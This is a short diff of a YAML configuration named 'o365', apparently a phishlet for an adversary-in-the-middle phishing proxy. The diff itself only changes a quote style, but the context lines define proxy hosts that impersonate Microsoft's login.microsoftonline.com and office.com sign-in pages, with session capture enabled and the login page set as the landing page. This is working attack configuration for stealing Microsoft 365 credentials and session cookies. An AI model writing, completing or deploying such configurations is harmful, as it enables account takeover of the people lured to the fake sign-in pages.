@@ -1,6 +1,6 @@
 name: 'o365'
 author: '@456478'
-min_ver: "2.3.0"
+min_ver: '2.3.0'
 proxy_hosts:
   - { phish_sub: "login", orig_sub: "login", domain: "microsoftonline.com", session: true, is_landing: true, auto_filter: false }
   - { phish_sub: "www", orig_sub: "www", domain: "office.com", session: true, is_landing: false, auto_filter: false }
